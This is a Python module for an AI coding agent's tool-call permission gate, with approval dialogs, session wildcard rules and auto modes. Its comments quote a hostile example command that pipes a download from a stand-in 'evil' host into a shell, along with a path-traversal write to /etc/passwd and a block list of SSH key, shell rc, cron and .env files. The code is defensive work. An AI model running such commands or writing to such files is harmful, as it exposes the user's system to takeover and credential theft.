"""Built-in PermissionExtension — interactive allow/deny gate on ``tool_call``.

Phase 1 of the tool-call permission/approval system. Modelled on
``@gotgenes/pi-permission-system``: mutating tools (bash-family + write-family)
are gated behind an interactive 4-option dialog when a UI is attached:

- ``Yes`` — allow this one call.
- ``Yes, for this session`` — allow + synthesize an ephemeral wildcard rule so
  similar calls in this session are auto-approved.
- ``No`` — block with a generic denial reason.
- ``No, provide reason`` — block with a user-supplied reason.

Esc / cancellation (``select`` returns ``None``) is treated as a denial.

Design notes:

- Read-only tools are silently allowed (``return None``) — no prompt.
- Headless / print / RPC runs (``not ctx.has_ui``) default to ALLOW so the
  non-interactive behaviour is preserved; :class:`GuardrailExtension` still
  hard-blocks dangerous patterns separately.
- Session rules are *ephemeral* — held in-memory for the process lifetime and
  cleared on the ``session_shutdown`` hook (which exists per
  :class:`~aelix_agent_core.harness.hooks.SessionShutdownHookEvent`).
- Prompts are serialized through an :class:`asyncio.Lock` so parallel tool
  calls cannot race two modals; the session-allow set is re-checked inside the
  lock to avoid prompting twice for a rule a concurrent prompt just added.

Registered AFTER :class:`GuardrailExtension` in ``cli/entry.py`` so hard-deny
guardrail patterns (e.g. ``rm -rf``) short-circuit via first-block-wins BEFORE
the permission prompt is shown.
"""

from __future__ import annotations

import asyncio
import os.path
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from fnmatch import fnmatch
from typing import Any

from aelix_agent_core.harness.hooks import (
    SessionShutdownHookEvent,
    ToolCallHookEvent,
    ToolCallResult,
)

from aelix_coding_agent.builtin.guardrail import _BASH_TOOLS, _WRITE_TOOLS
from aelix_coding_agent.builtin.permission_mode import (
    MODE_META,
    PermissionMode,
    PermissionPosture,
)
from aelix_coding_agent.extensions.api import ExtensionAPI, ExtensionContext

# Shell metacharacters that introduce a NEW command / sub-command. A
# session-approved bash prefix must NEVER auto-allow a command that contains one
# of these after the approved prefix (finding WP-0 #3): ``git commit *`` must not
# match ``git commit -m x && curl evil|sh``.
_SHELL_SEPARATORS = (";", "&&", "||", "|", "&", "`", "$(", "${", "\n", ">", "<")

# Mutating tools gated by the permission prompt — the union of the bash-family
# and write-family sets the guardrail uses.
_MUTATING = _BASH_TOOLS | _WRITE_TOOLS

# Dialog option labels (pi-permission-system parity).
_YES = "Yes"
_YES_SESSION = "Yes, for this session"
_NO = "No"
_NO_REASON = "No, provide reason"
_OPTIONS = [_YES, _YES_SESSION, _NO, _NO_REASON]


def _command_from_args(args: dict[str, Any]) -> str:
    """Best-effort extraction of the command string from a bash-family call."""

    for key in ("command", "cmd", "shell_command", "script"):
        value = args.get(key)
        if isinstance(value, str):
            return value
    return ""


def _path_from_args(args: dict[str, Any]) -> str:
    """Best-effort extraction of the target path from a write-family call."""

    for key in ("path", "file_path", "file", "filename", "filepath", "target"):
        value = args.get(key)
        if isinstance(value, str):
            return value
    return ""


def _rule_key(tool_name: str, args: dict[str, Any]) -> str:
    """Build the exact, TOOL-NAMESPACED rule key a call is matched against.

    The ``bash:`` / ``write:`` / ``tool:`` namespace prefix is literal in both
    the key and the synthesized wildcard, so a write rule can NEVER fnmatch a
    bash key and vice versa (W4 code-review MEDIUM — fnmatch ``*`` crosses
    spaces, so an un-namespaced ``src/*`` would match a bash ``src/foo.sh ...``).
    """

    if tool_name in _BASH_TOOLS:
        return f"bash:{_command_from_args(args) or tool_name}"
    if tool_name in _WRITE_TOOLS:
        path = _path_from_args(args)
        if not path:
            return f"write:{tool_name}"
        # Canonicalise the candidate path BEFORE matching so a traversal
        # candidate (``src/app/../../etc/passwd``) collapses to its real target
        # (``etc/passwd``) and can NOT fnmatch a ``write:src/app/*`` directory
        # grant (finding WP-0 #3 — fnmatch ``*`` spans ``/``). normpath is a
        # pure string canonicalisation (no filesystem access).
        norm = os.path.normpath(path.replace("\\", "/"))
        return f"write:{norm}"
    return f"tool:{tool_name}"


def _session_wildcard(tool_name: str, args: dict[str, Any]) -> str:
    """Synthesize a TOOL-NAMESPACED ephemeral session rule from a call.

    NEVER emits a bare ``*`` (W4 code-review HIGH): a ``*`` wildcard would
    fnmatch EVERY future rule_key, so approving-for-session one innocuous call
    would silently disarm the whole gate for the session. A call with no safe
    scope is pinned to its EXACT key instead.

    - bash-family: a multi-token command WITH NO shell separator → ``bash:{tok0}
      {tok1} *`` (matches that command prefix, e.g. ``git status --short`` →
      ``bash:git status *``); a single-token command OR any command that
      contains a shell separator (``;`` / ``&&`` / ``|`` / backtick / ``$(`` /
      redirect / newline) → ``bash:{command}`` EXACT. The exact-pin closes the
      finding WP-0 #3 escalation where ``bash:git commit *`` would also match
      ``git commit -m x && curl evil|sh``: fnmatch ``*`` spans separators, so a
      prefix wildcard is ONLY safe when the approved command itself has none.
    - write-family: a path with a parent dir → ``write:{parent}/*`` (covers that
      directory and its descendants for the session); the parent is
      ``normpath``-canonicalised and a ``..`` escape pins to the EXACT path
      instead (finding WP-0 #3 — a ``src/app/*`` grant must not be traversal-
      escaped to ``src/app/../../etc/passwd``). A bare filename (no parent) →
      ``write:{path}`` EXACT.
    - fallback: ``tool:{tool_name}`` exact.
    """

    if tool_name in _BASH_TOOLS:
        command = _command_from_args(args)
        if not command:
            return f"bash:{tool_name}"
        # A command containing a shell separator gets an EXACT pin: a wildcard
        # prefix would let fnmatch ``*`` span the separator and auto-allow an
        # appended ``&& curl … | sh``.
        if any(sep in command for sep in _SHELL_SEPARATORS):
            return f"bash:{command}"
        tokens = command.split()
        if len(tokens) <= 1:
            return f"bash:{command}"  # exact — a single token has no safe prefix
        return f"bash:{tokens[0]} {tokens[1]} *"
    if tool_name in _WRITE_TOOLS:
        path = _path_from_args(args)
        if not path:
            return f"write:{tool_name}"
        # Canonicalise the SAME way ``_rule_key`` does so the stored grant aligns
        # with the normalised candidate keys it is matched against.
        norm = os.path.normpath(path.replace("\\", "/"))
        parent = norm.rsplit("/", 1)[0] if "/" in norm else ""
        if not parent:
            return f"write:{norm}"
        # A parent that still escapes upward after normpath cannot be trusted as
        # a directory wildcard → pin to the exact path (finding WP-0 #3).
        if parent == ".." or parent.startswith("../") or "/../" in parent:
            return f"write:{norm}"
        return f"write:{parent}/*"
    return f"tool:{tool_name}"


def _request_kind(tool_name: str) -> str:
    """Map a tool name to the approval-dialog body kind (bash | write | edit | other)."""

    if tool_name in _BASH_TOOLS:
        return "bash"
    if tool_name == "edit":
        return "edit"
    if tool_name in _WRITE_TOOLS:
        return "write"
    return "other"


def _summary(tool_name: str, args: dict[str, Any]) -> str:
    """A short one-line summary of the call for the dialog title."""

    if tool_name in _BASH_TOOLS:
        return _command_from_args(args).strip()[:120]
    if tool_name in _WRITE_TOOLS:
        return _path_from_args(args).strip()[:120]
    return ""


# Security-sensitive file basenames / suffixes that must NEVER be auto-allowed
# even inside the project root (finding WP-0 #4 — silent persistence / backdoor
# surfaces). Matched on the resolved path's components.
_SENSITIVE_BASENAMES = frozenset(
    {
        ".bashrc",
        ".bash_profile",
        ".profile",
        ".zshrc",
        ".zprofile",
        ".zshenv",
        "authorized_keys",
        "id_rsa",
        "id_ed25519",
        "id_ecdsa",
        "id_dsa",
        "crontab",
        ".netrc",
        ".pgpass",
    }
)
# Path components that are always sensitive (an .ssh dir, cron spool, etc.).
_SENSITIVE_DIR_COMPONENTS = frozenset({".ssh", ".gnupg", "cron.d", "cron.daily"})


def _is_auto_allowable_write(path: str, cwd: str) -> bool:
    """Whether a write to ``path`` may be auto-allowed without a prompt.

    SECURITY (finding WP-0 #4): an AUTO_ACCEPT / AUTO write is auto-allowed ONLY
    when it resolves INSIDE the project root (``cwd``) AND is not a
    security-sensitive file (SSH keys, shell rc, cron). Everything else falls
    through to the prompt — writes to ``~/.ssh/authorized_keys`` / ``~/.bashrc``
    / ``/etc/crontab`` / ``../../etc/passwd`` are NOT silently accepted.

    Pure string / ``os.path`` reasoning (``expanduser`` + ``realpath``-free
    ``abspath`` + ``normpath``) — no filesystem access, so it is deterministic
    and unit-testable. A ``~`` is expanded so a home-relative path is judged
    against its real location (almost always OUTSIDE cwd → prompt).
    """

    if not path:
        return False
    raw = os.path.expanduser(path)
    abs_cwd = os.path.abspath(cwd) if cwd else os.path.abspath(".")
    abs_path = os.path.normpath(os.path.join(abs_cwd, raw))
    # Must be inside the project root (or be the root itself).
    if abs_path != abs_cwd and not abs_path.startswith(abs_cwd + os.sep):
        return False
    # Reject security-sensitive targets even inside the tree.
    components = abs_path.replace("\\", "/").split("/")
    basename = components[-1] if components else ""
    if basename in _SENSITIVE_BASENAMES:
        return False
    if basename == ".env" or basename.startswith(".env."):
        return False
    return not any(comp in _SENSITIVE_DIR_COMPONENTS for comp in components)


@dataclass
class PermissionExtension:
    """Interactive allow/deny gate registered as a built-in extension.

    Instances are valid
    :class:`~aelix_coding_agent.extensions.api.ExtensionFactory` callables —
    ``__call__(self, aelix)`` registers the ``tool_call`` + ``session_shutdown``
    handlers.
    """

    _session_allows: set[str] = field(default_factory=set)
    _lock: asyncio.Lock = field(default_factory=asyncio.Lock)
    # The shift+tab-cycled posture (WP-0, ADR-0157). ONE instance is built in
    # ``cli/entry.py`` and threaded by held reference into both this extension and
    # ``run_tui`` so the posture + ``_session_allows`` survive ``/resume`` /
    # ``/new`` / ``/fork`` harness rebuilds. ``default_factory`` keeps zero-arg
    # construction (and the existing tests) working — DEFAULT == always prompt.
    posture: PermissionPosture = field(default_factory=PermissionPosture)
    # Optional purpose-built approval-dialog runner (ADR-0157, STEP 5). The TUI
    # host wires this to drive ``run_approval_dialog`` (full command, diff
    # preview, no "Type to search"). ``None`` → the generic ``ctx.ui.select``
    # fallback (headless / tests), preserving prior behaviour. The callback maps
    # an :class:`ApprovalRequest` to an :class:`ApprovalDecision`.
    approval_runner: Callable[[Any], Awaitable[Any]] | None = None

    def __call__(self, aelix: ExtensionAPI) -> None:
        """Setup: register the ``tool_call`` + ``session_shutdown`` handlers."""

        aelix.on("tool_call", self._on_tool_call)
        aelix.on("session_shutdown", self._on_shutdown)

    def _is_session_allowed(self, rule_key: str) -> bool:
        # SECURITY (finding WP-0 #3 — matching side): a ``bash:`` candidate that
        # contains a shell separator must NEVER be auto-allowed by a PREFIX
        # wildcard (only by an exact-equal rule). Otherwise approving the benign
        # ``git commit -m hi`` (grant ``bash:git commit *``) would auto-allow the
        # malicious ``git commit -m x && curl evil|sh`` because fnmatch ``*``
        # spans the ``&&``. Such a candidate may match only a rule with no
        # trailing ``*`` (an exact pin), via plain string equality.
        if rule_key.startswith("bash:") and any(
            sep in rule_key[len("bash:") :] for sep in _SHELL_SEPARATORS
        ):
            return any(
                rule_key == w
                for w in self._session_allows
                if not w.endswith("*")
            )
        return any(fnmatch(rule_key, w) for w in self._session_allows)

    async def _on_tool_call(
        self,
        event: ToolCallHookEvent,
        ctx: ExtensionContext,
    ) -> ToolCallResult | None:
        mode = self.posture.get()
        is_bash = event.tool_name in _BASH_TOOLS
        is_mutating = event.tool_name in _MUTATING

        # (b) PLAN mode blocks ALL mutating tools — even on the headless / print /
        # rpc path (this check is placed ABOVE the read-only short-circuit and
        # the ``not has_ui`` ALLOW branch so the plan-mode guarantee holds on
        # non-interactive runs too). Read-only tools stay allowed so the agent
        # can still investigate while planning.
        if mode == PermissionMode.PLAN and is_mutating:
            return ToolCallResult(
                block=True, reason=MODE_META[PermissionMode.PLAN].block_reason
            )

        # (a) Read-only tools are silently allowed (all modes; PLAN handled above).
        if not is_mutating:
            return None

        rule_key = _rule_key(event.tool_name, event.args)

        # (c) Session-approved (wildcard match) → allow without prompting.
        if self._is_session_allowed(rule_key):
            return None

        # (e) YOLO — skip the PROMPT for every mutating tool. The
        # GuardrailExtension already ran FIRST (prepend order in cli/entry.py:
        # ``[GuardrailExtension(), permission_ext]``, first-block-wins), so
        # catastrophic patterns (rm -rf / fork-bomb / .env|.git writes) are STILL
        # hard-denied — YOLO bypasses the prompt, NOT the floor. DO NOT reorder the
        # prepend or merge the two extensions or this guarantee breaks.
        if mode == PermissionMode.YOLO:
            return None

        # (f) AUTO_ACCEPT — auto-allow the write-family without a prompt; bash
        # still prompts (bash can do arbitrary damage). Non-bash mutating ==
        # write-family here. SECURITY (finding WP-0 #4): only auto-allow writes
        # that resolve INSIDE the project root and are not security-sensitive
        # (SSH keys / shell rc / cron / .env); anything else falls through to the
        # prompt so AUTO_ACCEPT can never silently plant a backdoor outside cwd.
        if (
            mode == PermissionMode.AUTO_ACCEPT
            and not is_bash
            and _is_auto_allowable_write(_path_from_args(event.args), ctx.cwd)
        ):
            return None
        # else (AUTO_ACCEPT write outside cwd / sensitive): fall through to the
        # prompt (or headless-allow below).

        # (g) AUTO — classify bash via tree-sitter (ADR-0158): ALLOW→no prompt,
        # ASK→prompt, DENY→block. Non-bash mutating behaves like AUTO_ACCEPT
        # (auto-allow writes). If the classifier is unavailable the bash path
        # falls through to the prompt (DEFAULT semantics) — NEVER silent-allow.
        if mode == PermissionMode.AUTO:
            if not is_bash:
                # Writes auto-allowed ONLY inside the project root and not
                # security-sensitive (finding WP-0 #4); else fall through to the
                # headless-allow / prompt path below (same as AUTO_ACCEPT).
                if _is_auto_allowable_write(_path_from_args(event.args), ctx.cwd):
                    return None
            else:
                decision = self._auto_classify_bash(event.args)
                if decision == "allow":
                    return None
                if decision == "deny":
                    return ToolCallResult(
                        block=True,
                        reason="Auto mode: command classified as dangerous; blocked.",
                    )
                # "ask" (or classifier unavailable) → fall through to the prompt.

        # (d) Headless / print / RPC default = ALLOW for DEFAULT / AUTO_ACCEPT /
        # YOLO / AUTO-ask (preserve non-interactive behaviour; the guardrail
        # still hard-blocks separately). PLAN already denied above.
        if not ctx.has_ui:
            return None

        # (h) DEFAULT (and AUTO_ACCEPT bash / AUTO-ask bash) → the 4-option prompt.
        # Serialize prompts so parallel tool calls never race two modals.
        async with self._lock:
            # Re-check inside the lock — a concurrent prompt may have just
            # added a matching session rule.
            if self._is_session_allowed(rule_key):
                return None
            return await self._prompt(event, ctx)

    @staticmethod
    def _auto_classify_bash(args: dict[str, Any]) -> str:
        """Map the bash command to ``"allow"`` / ``"ask"`` / ``"deny"`` (fail-safe ASK).

        Imported lazily so a missing tree-sitter grammar degrades to ASK without
        breaking import of this module on an exotic no-wheel platform.
        """

        try:
            from aelix_coding_agent.builtin.bash_classifier import Verdict, classify

            command = _command_from_args(args)
            verdict = classify(command)
        except Exception:  # noqa: BLE001 — any classifier failure → ASK (safe)
            return "ask"
        if verdict == Verdict.ALLOW:
            return "allow"
        if verdict == Verdict.DENY:
            return "deny"
        return "ask"

    async def _prompt(
        self, event: ToolCallHookEvent, ctx: ExtensionContext
    ) -> ToolCallResult | None:
        """Run the approval prompt (purpose-built dialog or generic fallback).

        Fail SAFE: if the UI prompt itself raises mid-turn (terminal detached /
        app torn down), block rather than let the exception abort the turn via
        the hook's throw default (W4 code-review MEDIUM).
        """

        if self.approval_runner is not None:
            return await self._prompt_via_dialog(event)

        summary = _summary(event.tool_name, event.args)
        title = f"Allow {event.tool_name}? {summary}".rstrip()
        try:
            choice = await ctx.ui.select(title, _OPTIONS)
        except Exception as exc:  # noqa: BLE001 — deny-on-error is fail-safe
            return ToolCallResult(
                block=True,
                reason=(
                    "Permission prompt unavailable; denied for safety "
                    f"({exc.__class__.__name__})."
                ),
            )

        if choice == _YES:
            return None
        if choice == _YES_SESSION:
            self._session_allows.add(_session_wildcard(event.tool_name, event.args))
            return None
        if choice == _NO:
            return ToolCallResult(block=True, reason="Denied by the user.")
        if choice == _NO_REASON:
            try:
                reason = await ctx.ui.input("Why is this denied?")
            except Exception:  # noqa: BLE001 — reason is optional; still deny
                reason = None
            return ToolCallResult(
                block=True,
                reason=f"Denied by the user: {reason or '(no reason given)'}",
            )
        # None (Esc / cancelled) or any unexpected value → deny.
        return ToolCallResult(block=True, reason="Denied by the user (cancelled).")

    async def _prompt_via_dialog(
        self, event: ToolCallHookEvent
    ) -> ToolCallResult | None:
        """Drive the purpose-built approval dialog (ADR-0157, STEP 5)."""

        from aelix_coding_agent.tui.approval_dialog import (
            ApprovalDecision,
            ApprovalRequest,
        )

        request = ApprovalRequest(
            tool_name=event.tool_name,
            args=event.args,
            kind=_request_kind(event.tool_name),
        )
        try:
            decision = await self.approval_runner(request)  # type: ignore[misc]
        except Exception as exc:  # noqa: BLE001 — deny-on-error is fail-safe
            return ToolCallResult(
                block=True,
                reason=(
                    "Permission prompt unavailable; denied for safety "
                    f"({exc.__class__.__name__})."
                ),
            )
        if decision == ApprovalDecision.YES:
            return None
        if decision == ApprovalDecision.YES_SESSION:
            self._session_allows.add(_session_wildcard(event.tool_name, event.args))
            return None
        if decision == ApprovalDecision.NO:
            return ToolCallResult(block=True, reason="Denied by the user.")
        if decision == ApprovalDecision.NO_REASON:
            return ToolCallResult(
                block=True, reason="Denied by the user (reason requested)."
            )
        # CANCEL / Esc / unknown → deny.
        return ToolCallResult(block=True, reason="Denied by the user (cancelled).")

    def _on_shutdown(
        self,
        _event: SessionShutdownHookEvent,
        _ctx: ExtensionContext,
    ) -> None:
        self._session_allows.clear()


__all__ = ["PermissionExtension"]
